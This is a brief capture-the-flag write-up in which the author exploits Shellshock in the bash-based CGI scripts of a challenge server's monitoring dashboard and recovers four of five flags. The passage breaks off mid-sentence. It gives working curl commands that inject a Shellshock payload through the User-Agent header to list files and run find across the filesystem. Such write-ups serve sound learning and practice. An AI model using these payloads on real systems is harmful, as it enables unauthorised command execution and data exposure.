Target: 54.83.28.186

Note: I did not get the final flag on this challenge.

This challenge had a System Monitoring dashboard which had a few CGI Scripts.  The names of the CGI files were standard linux binaries (ps, who, ifconfig, etc).  This led me to believe the CGI Scripts were just bash scripts, which had a major vulnerability recently (September 2014).  The dashboard had a "Package List" so I went there to confirm the version of bash and saw it was at 4.2-2, which is vulnerable to Shellshock.

Since Apache passes the User Agent to the CGI Scripts, it is possible to exploit over the web.  I had used a simple curl string to confirm the server was vulnerable: `curl -k -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/ls' https://54.83.28.186/cgi-bin/sysinfo.cgi`.  Once I confirmed it was vulnerable I had copied a list of all the filenames the www-data had access to via: `curl -k -A '() { :;}; echo "Content-Type: text/plain"; echo; /usr/bin/find /' https://54.83.28.186/cgi-bin/sysinfo.cgi > files.lst`.  Running grep flag files.lst, I was able to find 4 flag locations, a simple cat would retrieve the flags.  Unfortunately, the fifth flag was not there, I had done recursive grep for NCL- to search the contents of every file www-data had access to.  No luck.

I suspect the flag is owned by root and therefore hidden to the www-data user.  The kernel appears vulnerable to
